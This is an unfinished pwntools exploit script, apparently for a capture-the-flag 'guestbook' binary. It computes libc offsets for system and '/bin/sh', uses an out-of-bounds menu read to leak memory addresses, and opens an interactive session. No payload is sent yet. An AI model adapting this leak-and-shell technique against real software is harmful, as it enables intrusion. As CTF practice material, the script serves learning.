#! /usr/bin/env python

from pwn import *

#s = process('./guestbook', env={'LD_PRELOAD':'./libc.so.6'})
#s = process(["./guestbook"], env={"LD_PRELOAD":"./libc.so.6"})
s = process('./guestbook')
libc = ELF('./libc.so.6')

system_offset = libc.sym['system']
print 'system_offset =', hex(system_offset)

bin_sh_offset = next(libc.search('/bin/sh'))
print 'bin_sh_offset =', hex(bin_sh_offset)

dif = 0x300
malloc_offset = libc.sym['malloc']
print 'malloc_offset =', hex(malloc_offset)

s.recvuntil('>>>')
s.sendline('AAAA')
s.recvuntil('>>>')
s.sendline('BBBB')
s.recvuntil('>>>')
s.sendline('CCCC')
s.recvuntil('>>>')
s.sendline('DDDD')

s.recvuntil('>>')
s.sendline('1')
s.recvuntil('>>>')
s.sendline('6')

leak_l1 = s.recvline()
leak_l2 = s.recvline()
print 'leak_l1 =', hex(int(leak_l1.encode('hex'), 16))
print 'leak_l2 =', hex(int(leak_l2.encode('hex'), 16))


print hex(u32(leak_l1[:4]))
print hex(u32(leak_l1[4:8]))
print hex(u32(leak_l1[8:12]))
print hex(u32(leak_l1[12:16]))
print hex(u32(leak_l1[16:20]))
print '-------------'
print hex(u32(leak_l2[:4]))
print hex(u32(leak_l2[4:8]))
print hex(u32(leak_l2[8:12]))

system_addr = u32(leak_l2[4:8])

# cm exp_test.py

s.interactive()


